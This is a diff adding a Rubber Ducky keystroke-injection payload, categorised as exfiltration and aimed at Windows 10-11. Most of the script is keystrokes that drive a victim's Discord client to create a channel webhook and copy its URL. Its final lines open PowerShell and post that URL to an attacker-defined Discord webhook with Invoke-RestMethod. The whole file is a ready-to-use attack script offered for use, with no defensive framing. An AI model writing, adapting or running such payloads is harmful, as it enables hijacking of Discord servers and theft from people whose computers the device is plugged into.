@@ -1,0 +1,142 @@
+REM ###############################################################
+REM #                                                             |
+REM # Title        : Create And Exfiltrate A Webhook Of Discord   |
+REM # Author       : Aleff                                        |
+REM # Version      : 1.0                                          |
+REM # Category     : Exfiltration                                 |
+REM # Target       : Windows 10-11                                |
+REM #                                                             |
+REM ###############################################################
+
+
+REM Requirements:
+REM     - Internet connection
+REM     - Discord Installed
+
+
+REM You must define the Discord server name i.e. Hak5
+DEFINE #SERVER_NAME example
+
+REM You must define your Discord webhook if you want to use this method for the exfiltration
+DEFINE #DISCORD_WEBHOOK example
+
+REM Open Discord app
+GUI
+DELAY 1000
+STRING Discord
+ENTER
+
+REM It depends
+DELAY 6000
+
+REM Search by Discord keyboard shortcut and open it
+CTRL k
+DELAY 500
+STRINGLN *#SERVER_NAME
+DELAY 500
+
+REM Go to first channel and open the settings
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+
+REM Open Integrations section
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+DOWN_ARROW
+DELAY 500
+DOWN_ARROW
+DELAY 500
+DOWN_ARROW
+DELAY 500
+ENTER
+DELAY 500
+
+REM Webhooks settings
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+
+REM Create Webhook
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+
+REM Select first Webhook
+TAB
+DELAY 500
+ENTER
+DELAY 500
+
+REM Copy Webhook
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+SPACE
+DELAY 500
+
+REM Close Discord
+ALT F4
+
+REM Open a PowerShell
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 2000
+
+REM Exfiltration using Discord Webhook
+STRINGLN $WebhookUrl = "#DISCORD_WEBHOOK"
+
+STRING $Payload = @{content = "
+CTRL v
+STRINGLN "} | ConvertTo-Json
+
+STRINGLN Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'; exit;
